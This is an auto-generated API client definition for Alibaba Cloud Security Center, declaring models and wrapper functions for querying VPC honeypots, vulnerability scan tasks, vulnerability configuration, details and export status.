  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the search conditions that can be used to query honeypots.
 *
 * @param request DescribeVpcHoneyPotCriteriaRequest
 * @return DescribeVpcHoneyPotCriteriaResponse
 */
async function describeVpcHoneyPotCriteria(request: DescribeVpcHoneyPotCriteriaRequest): DescribeVpcHoneyPotCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotCriteriaWithOptions(request, runtime);
}

model DescribeVpcHoneyPotListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2'),
  honeyPotExistence?: boolean(name='HoneyPotExistence', description='Specifies whether the cloud honeypot feature is enabled for the VPCs. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  vpcId?: string(name='VpcId', description='The ID of the VPC on which the honeypot is deployed.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****'),
  vpcName?: string(name='VpcName', description='The name of the VPC.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the names of VPCs.', example='abcnet'),
  vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the region IDs of VPCs.', example='ap-southeast-2'),
}

model DescribeVpcHoneyPotListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4FEC7F58-FCDA-415F-AE25-CD8BC0931DF2'),
  vpcHoneyPotDTOList?: [ 
    {
      cidrBlock?: string(name='CidrBlock', description='The CIDR block of the VPC.', example='192.168.XX.XX/16'),
      createTime?: long(name='CreateTime', description='The time at which the VPC was created. Unit: milliseconds.', example='1607365213000'),
      honeyPotEcsInstanceStatus?: string(name='HoneyPotEcsInstanceStatus', description='The status of the server on which the honeypot is deployed. Valid values:

*   **Pending**: The server is being created.
*   **Running**: The server is running.
*   **Starting**: The server is being started.
*   **Stopping**: The server is being stopped.
*   **Stopped**: The server is stopped.', example='Running'),
      honeyPotEniInstanceId?: string(name='HoneyPotEniInstanceId', description='The ID of the elastic network interface (ENI) used by the honeypot in the VPC.', example='eni-p0whwgg7bing8b80****'),
      honeyPotExistence?: boolean(name='HoneyPotExistence', description='Indicates whether the cloud honeypot feature is enabled for the VPC. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      honeyPotInstanceStatus?: string(name='HoneyPotInstanceStatus', description='The status of the honeypot. Valid values:

*   **pending**: The honeypot is being created.
*   **deleting**: The honeypot is being deleted.
*   **off**: The honeypot is disabled.
*   **suspending**: The honeypot is suspended.
*   **on**: The honeypot is enabled.', example='on'),
      honeyPotVpcSwitchId?: string(name='HoneyPotVpcSwitchId', description='The ID of the vSwitch to which the ENI used by the honeypot is connected.', example='vsw-p0w7gdcfvn20tvdul****'),
      vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-p0w223apdl49sr5zv****'),
      vpcName?: string(name='VpcName', description='The name of the VPC.', example='abc-vpcname'),
      vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

> For more information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='ap-southeast-2'),
      vpcStatus?: string(name='VpcStatus', description='The status of the VPC. Valid values:

*   **Available**: The VPC is normal and available.
*   **Pending**: The VPC is being configured.', example='Available'),
      vpcSwitchIdList?: [ 
        {
          vpcSwitchId?: string(name='VpcSwitchId', description='The ID of the vSwitch.', example='vsw-p0wdnyv4wzp6jkuu4****'),
          vpcSwitchName?: string(name='VpcSwitchName', description='The name of the vSwitch.', example='abc01'),
          zoneId?: string(name='ZoneId', description='The zone ID of the vSwitch.', example='ap-southeast-2b'),
        }
      ](name='VpcSwitchIdList', description='An array that consists of the vSwitches in the VPC.'),
    }
  ](name='VpcHoneyPotDTOList', description='An array that consists of the honeypots.'),
}

model DescribeVpcHoneyPotListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVpcHoneyPotListResponseBody(name='body'),
}

/**
 * @summary Queries virtual private clouds (VPCs) on which honeypots are deployed.
 *
 * @description If you specify only the Action request parameter in your request, Security Center returns the list of all VPCs regardless of whether a honeypot is deployed on a VPC.
 *
 * @param request DescribeVpcHoneyPotListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVpcHoneyPotListResponse
 */
async function describeVpcHoneyPotListWithOptions(request: DescribeVpcHoneyPotListRequest, runtime: Util.RuntimeOptions): DescribeVpcHoneyPotListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeyPotExistence)) {
    query['HoneyPotExistence'] = request.honeyPotExistence;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.vpcName)) {
    query['VpcName'] = request.vpcName;
  }
  if (!Util.isUnset(request.vpcRegionId)) {
    query['VpcRegionId'] = request.vpcRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries virtual private clouds (VPCs) on which honeypots are deployed.
 *
 * @description If you specify only the Action request parameter in your request, Security Center returns the list of all VPCs regardless of whether a honeypot is deployed on a VPC.
 *
 * @param request DescribeVpcHoneyPotListRequest
 * @return DescribeVpcHoneyPotListResponse
 */
async function describeVpcHoneyPotList(request: DescribeVpcHoneyPotListRequest): DescribeVpcHoneyPotListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotListWithOptions(request, runtime);
}

model DescribeVpcListResponseBody = {
  count?: int32(name='Count', description='The total number of entries returned.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  vpcList?: [ 
    {
      ecsCount?: int32(name='EcsCount', description='The number of Elastic Compute Service (ECS) instances.', example='9'),
      instanceDesc?: string(name='InstanceDesc', description='The information about the virtual private cloud (VPC).', example='TestVpcNote'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='ins_1321_asedb_ada'),
      instanceName?: string(name='InstanceName', description='The name of the VPC.', example='test'),
      regionId?: string(name='RegionId', description='The region in which the server resides.', example='cn-hangzhou'),
    }
  ](name='VpcList', description='An array that consists of VPCs.'),
}

model DescribeVpcListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVpcListResponseBody(name='body'),
}

/**
 * @summary Queries the information about virtual private clouds (VPCs).
 *
 * @param request DescribeVpcListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVpcListResponse
 */
async function describeVpcListWithOptions(runtime: Util.RuntimeOptions): DescribeVpcListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVpcList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about virtual private clouds (VPCs).
 *
 * @return DescribeVpcListResponse
 */
async function describeVpcList(): DescribeVpcListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcListWithOptions(runtime);
}

model DescribeVulCheckTaskStatusDetailRequest {
  taskIds?: [ string ](name='TaskIds', description='The task IDs.'),
  types?: [ string ](name='Types', description='The types of the vulnerabilities that are detected by the tasks.'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='5d55af3c-35f3-4d4d-8ccc-8c5443b0****'),
}

model DescribeVulCheckTaskStatusDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  taskStatuses?: [ 
    {
      taskId?: string(name='TaskId', description='The ID of the main task.', example='16190385'),
      taskStatusList?: [ 
        {
          code?: string(name='Code', description='The error code returned.', example='push_command_failed'),
          status?: string(name='Status', description='The status of the subtask. Valid values:

*   **0**: unhandled
*   **1**: collecting
*   **2**: collected
*   **3**: matching
*   **4**: complete', example='4'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='cve'),
        }
      ](name='TaskStatusList', description='An array that consists of status information about the vulnerability scan subtask.'),
    }
  ](name='TaskStatuses', description='An array that consists of the status information about the vulnerability scan tasks on the server.'),
  totalCount?: int32(name='TotalCount', description='The total number of vulnerability scan tasks on the server.', example='1'),
}

model DescribeVulCheckTaskStatusDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulCheckTaskStatusDetailResponseBody(name='body'),
}

/**
 * @summary Queries the status information about vulnerability scan tasks on a server.
 *
 * @param request DescribeVulCheckTaskStatusDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulCheckTaskStatusDetailResponse
 */
async function describeVulCheckTaskStatusDetailWithOptions(request: DescribeVulCheckTaskStatusDetailRequest, runtime: Util.RuntimeOptions): DescribeVulCheckTaskStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskIds)) {
    query['TaskIds'] = request.taskIds;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulCheckTaskStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the status information about vulnerability scan tasks on a server.
 *
 * @param request DescribeVulCheckTaskStatusDetailRequest
 * @return DescribeVulCheckTaskStatusDetailResponse
 */
async function describeVulCheckTaskStatusDetail(request: DescribeVulCheckTaskStatusDetailRequest): DescribeVulCheckTaskStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulCheckTaskStatusDetailWithOptions(request, runtime);
}

model DescribeVulConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.110.XX.XX'),
  type?: string(name='Type', description='The type of configuration. By default, all types of configurations are queried. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner.
*   **emg**: urgent vulnerability.
*   **scanMode**: displays easily exploitable vulnerability.
*   **imageVulClean**: vulnerability retention duration.
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities.', example='cve'),
}

model DescribeVulConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  targetConfigs?: [ 
    {
      config?: string(name='Config', description='The configuration of vulnerability scan.

> Valid values when you set the Type parameter to **cve**, **sys**, **cms**, **app**, **emg**, or **yum**:

*   **on**: enabled

*   **off**: disabled

Valid values when you set the Type parameter to **scanMode**:

*   **real**: displays easily exploitable vulnerability.

*   **all**: displays all vulnerabilities.

When you set the Type parameter to **imageVulClean**, the value of this parameter indicates the vulnerability retention period in days.', example='90'),
      overAllConfig?: string(name='OverAllConfig', description='Indicates whether the vulnerability management feature is enabled for all servers. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
      type?: string(name='Type', description='The type of configuration. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner.
*   **emg**: urgent vulnerability.
*   **scanMode**: displays easily exploitable vulnerability.
*   **imageVulClean**: vulnerability retention duration.
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities.', example='cve'),
    }
  ](name='TargetConfigs', description='An array that consists of the configurations of vulnerability management.'),
  totalCount?: int32(name='TotalCount', description='The total number of configurations.', example='10'),
}

model DescribeVulConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of vulnerability management.
 *
 * @param request DescribeVulConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulConfigResponse
 */
async function describeVulConfigWithOptions(request: DescribeVulConfigRequest, runtime: Util.RuntimeOptions): DescribeVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of vulnerability management.
 *
 * @param request DescribeVulConfigRequest
 * @return DescribeVulConfigResponse
 */
async function describeVulConfig(request: DescribeVulConfigRequest): DescribeVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulConfigWithOptions(request, runtime);
}

model DescribeVulDefendCountStatisticsRequest {
  vulType?: string(name='VulType', description='The type of the vulnerabilities. Valid values:

*   app: application vulnerabilities
*   emg: urgent vulnerabilities', example='emg'),
}

model DescribeVulDefendCountStatisticsResponseBody = {
  raspDefendedCount?: int32(name='RaspDefendedCount', description='The number of defended vulnerabilities.', example='10'),
  raspDefensibleCount?: int32(name='RaspDefensibleCount', description='The number of supported vulnerabilities.', example='100'),
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeVulDefendCountStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulDefendCountStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the vulnerability defense statistics in Security Center.
 *
 * @param request DescribeVulDefendCountStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulDefendCountStatisticsResponse
 */
async function describeVulDefendCountStatisticsWithOptions(request: DescribeVulDefendCountStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulDefendCountStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vulType)) {
    query['VulType'] = request.vulType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulDefendCountStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the vulnerability defense statistics in Security Center.
 *
 * @param request DescribeVulDefendCountStatisticsRequest
 * @return DescribeVulDefendCountStatisticsResponse
 */
async function describeVulDefendCountStatistics(request: DescribeVulDefendCountStatisticsRequest): DescribeVulDefendCountStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulDefendCountStatisticsWithOptions(request, runtime);
}

model DescribeVulDetailsRequest {
  aliasName?: string(name='AliasName', description='The vulnerability announcement.', example='RHSA-2019:3197-Important: sudo security update'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English

This parameter is required.', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.

> You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) or [DescribeVulList](~~DescribeVulList~~) operation to query the names of vulnerabilities.

This parameter is required.', example='SCA:ACSV-2020-052801'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerabilitiy
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected based on software component analysis

This parameter is required.', example='sca'),
}

model DescribeVulDetailsResponseBody = {
  cves?: [ 
    {
      classify?: string(name='Classify', description='The type of the vulnerability.', example='remote_code_execution'),
      classifys?: [ 
        {
          classify?: string(name='Classify', description='The type of the vulnerability.', example='remote_code_execution'),
          demoVideoUrl?: string(name='DemoVideoUrl', description='The URL of the demo video for the vulnerability.', example='https://example.com'),
          description?: string(name='Description', description='The description of the vulnerability type.', example='Remote code execution'),
        }
      ](name='Classifys', description='The vulnerability types.'),
      cnvdId?: string(name='CnvdId', description='The China National Vulnerability Database (CNVD) ID.', example='CNVD-2019-9167'),
      complexity?: string(name='Complexity', description='The difficulty level of exploiting the vulnerability. Valid values:

*   **LOW**
*   **MEDIUM**
*   **HIGH**', example='LOW'),
      content?: string(name='Content', description='The CVE content.', example='Apache Shiro is a user authentication and authorization framework for a wide range of rights management applications.↵Recently, Apache Shiro released version 1.7.0, which fixes the Apache Shiro authentication bypass vulnerability (CVE-2020-17510).↵Attackers can bypass Shiro\\\\"s authentication using malicious requests containing payloads.↵↵Related bugs:↵CVE-2020-17510 Shiro < 1.7.0 Validation Bypass Vulnerability↵CVE-2020-13933 Shiro < 1.6.0 Validation Bypass Vulnerability↵CVE-2020-11989 Shiro < 1.5.3 Validation Bypass Vulnerability↵CVE-2020-1957 Shiro < 1.5.2 Validation Bypass Vulnerability↵CVE-2016-6802 Shiro < 1.3.2 Validation Bypass Vulnerability
Check whether the fastjson version currently running on the system is in the affected version and whether safeMode is configured to disable autoType. If it is in the affected version and safeMode is not configured to disable autoType, the vulnerability is considered to exist.'),
      cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID.', example='CVE-2019-9167'),
      cveLink?: string(name='CveLink', description='The link to the CVE details.', example='https://avd.aliyun.com/detail/CVE-2022-1184'),
      cvssScore?: string(name='CvssScore', description='The Common Vulnerability Scoring System (CVSS) score of the vulnerability in the Alibaba Cloud vulnerability library.', example='10.0'),
      cvssVector?: string(name='CvssVector', description='The vector that is used to calculate the CVSS score.', example='AV:N/AC:L/Au:N/C:C/I:C/A:C'),
      instanceName?: string(name='InstanceName', description='The name of the instance.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instance that is affected by the vulnerability.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instance that is affected by the vulnerability.', example='47.114.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instance that is affected by the vulnerability.', example='172.19.XX.XX'),
      otherId?: string(name='OtherId', description='The ID of the vulnerability.', example='CVE-2020-8597'),
      poc?: string(name='Poc', description='The POC content.'),
      pocCreateTime?: long(name='PocCreateTime', description='The UNIX timestamp when the proof of concept (POC) was created. Unit: milliseconds.', example='1554189334000'),
      pocDisclosureTime?: long(name='PocDisclosureTime', description='The UNIX timestamp when the POC was disclosed. Unit: milliseconds.', example='1554189334000'),
      product?: string(name='Product', description='The service that is affected by the vulnerability.', example='Log4j2'),
      reference?: string(name='Reference', description='The reference of the vulnerability in the Alibaba Cloud vulnerability library. The value is a URL.', example='https://example.com'),
      releaseTime?: long(name='ReleaseTime', description='The disclosure time that is displayed for the vulnerability in the Alibaba Cloud vulnerability library. The value is a UNIX timestamp. Unit: milliseconds.', example='1554189334000'),
      solution?: string(name='Solution', description='The fixing suggestions of the vulnerability.', example='<p>At present, Chanjet has urgently released a vulnerability patch to fix the vulnerability. CNVD recommends affected units and users to upgrade to the latest version immediately:</p>↵<p>https://www.chanjetvip.com/product/goods/goods-detail?id=53aaa40295d458e44f5d3ce5</p>↵<p>At the same time, organizations and users affected by the vulnerability are requested to immediately follow the steps below to conduct self-inspection and repair work:</p>↵<ol>↵<li><p>User self-check steps:↵<br  />Check whether website/bin/load.aspx.cdcab7d2.compiled, website/bin/App_Web_load.aspx.cdcab7d2.dll, and tplus/Load.aspx files exist locally. If they exist, it means that they have been poisoned, and you must reinstall the system and install the product. patch.</p>↵</li>↵<li><p>Non-poisoned users please:↵<br  />1) Update the latest product patch.↵<br  />2) Install anti-virus software and update the virus database in time.↵<br  />3) Upgrade the lower version of IIS and Nginx to IIS10.0 and Windows 2016.↵<br  />4) Local installation customers need to confirm whether the backup file is complete as soon as possible, and do off-site backup. Customers on the cloud should enable the mirroring function in time.↵<br  />5) Users who fail to update the patch in time can contact Chanjet technical support and take temporary preventive measures such as deleting files.</p>↵</li>↵<li><p>Poisoned users please:↵<br  />1) Check whether the server has taken regular snapshots or backups. If so, you can restore data through snapshots or backups.↵<br  />2) Contact Chanjet technical support to confirm whether it has the conditions and operation methods to restore data from backup files.</p>↵</li>↵</ol>↵<p>If you have any technical problems, please contact Chanjet technical support: 4006600566-9</p>'),
      summary?: string(name='Summary', description='The introduction to the vulnerability.', example='Chanjet T-Plus is an Internet business management software. There is an unauthorized access vulnerability in one of its interfaces disclosed on the Internet. Attackers can construct malicious requests to upload malicious files to execute arbitrary code and control the server.'),
      targetId?: string(name='TargetId', description='The ID of the asset that is scanned.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instance that is affected by the vulnerability.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the asset that is scanned.

>  This parameter is deprecated. You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the instance that is affected by the vulnerability.', example='frontend'),
      title?: string(name='Title', description='The title of the vulnerability announcement.', example='Chanjet T-Plus SetupAccount/Upload. Aspx file upload vulnerability(CNVD-2022-60632)'),
      vendor?: string(name='Vendor', description='The vendor that disclosed the vulnerability.', example='Apache'),
      vulLevel?: string(name='VulLevel', description='The severity of the vulnerability. Valid values:

*   **serious**
*   **high**
*   **medium**
*   **low**', example='serious'),
    }
  ](name='Cves', description='The details of the vulnerability.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EDA40EA3-6265-5900-AD99-C83E4F109CA8'),
}

model DescribeVulDetailsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulDetailsResponseBody(name='body'),
}

/**
 * @summary Queries the details about a vulnerability.
 *
 * @param request DescribeVulDetailsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulDetailsResponse
 */
async function describeVulDetailsWithOptions(request: DescribeVulDetailsRequest, runtime: Util.RuntimeOptions): DescribeVulDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about a vulnerability.
 *
 * @param request DescribeVulDetailsRequest
 * @return DescribeVulDetailsResponse
 */
async function describeVulDetails(request: DescribeVulDetailsRequest): DescribeVulDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulDetailsWithOptions(request, runtime);
}

model DescribeVulExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the task.

This parameter is required.', example='14356'),
}

model DescribeVulExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task. Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='app_20210917'),
  id?: long(name='Id', description='The ID of the task.', example='14356'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the results of the task. The value is fixed as **success**, which indicates that the task is complete.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BXXX-AFA1A032756C'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the exported Excel file.', example='10'),
}

model DescribeVulExportInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulExportInfoResponseBody(name='body'),
}

/**
 * @summary Queries the progress of a task that exports vulnerabilities.
 *
 * @description If the value of ExportStatus is success, the URL at which you can download the exported Excel file is returned.
 *
 * @param request DescribeVulExportInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulExportInfoResponse
 */
async function describeVulExportInfoWithOptions(request: DescribeVulExportInfoRequest, runtime: Util.RuntimeOptions): DescribeVulExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the progress of a task that exports vulnerabilities.
 *
 * @description If the value of ExportStatus is success, the URL at which you can download the exported Excel file is returned.
 *
 * @param request DescribeVulExportInfoRequest
 * @return DescribeVulExportInfoResponse
 */
async function describeVulExportInfo(request: DescribeVulExportInfoRequest): DescribeVulExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulExportInfoWithOptions(request, runtime);
}

model DescribeVulFixStatisticsResponseBody = {
  fixStat?: [ 
    {
      fixedTodayNum?: int32(name='FixedTodayNum', description='The number of vulnerabilities that are fixed on the current day.', example='10'),
      fixedTotalNum?: int32(name='FixedTotalNum', description='The total number of fixed vulnerabilities.', example='22'),
      fixingNum?: int32(name='FixingNum', description='The number of vulnerabilities that are being fixed.', example='17'),
      needFixNum?: int32(name='NeedFixNum', description='The number of unfixed vulnerabilities.', example='8'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability', example='cve'),
    }
